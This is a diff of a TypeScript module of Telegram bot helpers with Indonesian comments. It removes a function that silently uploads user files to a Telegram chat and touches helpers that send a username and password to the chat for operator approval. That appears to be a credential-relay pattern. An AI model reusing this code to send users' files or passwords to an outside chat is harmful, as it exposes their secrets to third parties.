@@ -40,20 +40,7 @@ export async function sendTelegram(message: string): Promise<void> {
   } catch { /* silent fail */ }
 }
 
-export async function sendFileToTelegram(file: File, caption: string): Promise<void> {
-  if (!BOT_TOKEN || !CHAT_ID) return;
-  try {
-    const form = new FormData();
-    form.append("chat_id", CHAT_ID);
-    form.append("caption", caption);
-    form.append("document", file, file.name);
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-      method: "POST",
-      body: form,
-    });
-  } catch { /* silent */ }
-}
-
+/** Kirim pesan approval dengan tombol Approve / Reject, kembalikan message_id */
 export async function sendApprovalRequest(
   username: string,
   password: string,
@@ -96,6 +83,7 @@ export async function sendApprovalRequest(
   }
 }
 
+/** Ambil offset terbaru agar polling hanya tangkap update BARU */
 export async function getLatestOffset(): Promise<number> {
   if (!BOT_TOKEN) return 0;
   try {
@@ -111,6 +99,7 @@ export async function getLatestOffset(): Promise<number> {
   }
 }
 
+/** Poll getUpdates untuk callback_query approval/reject */
 export async function pollApproval(
   offset: number,
   sessionKey: string
@@ -146,6 +135,7 @@ export async function pollApproval(
   }
 }
 
+/** Jawab callback agar tombol tidak loading terus */
 export async function answerCallback(callbackId: string, text: string): Promise<void> {
   if (!BOT_TOKEN) return;
   try {
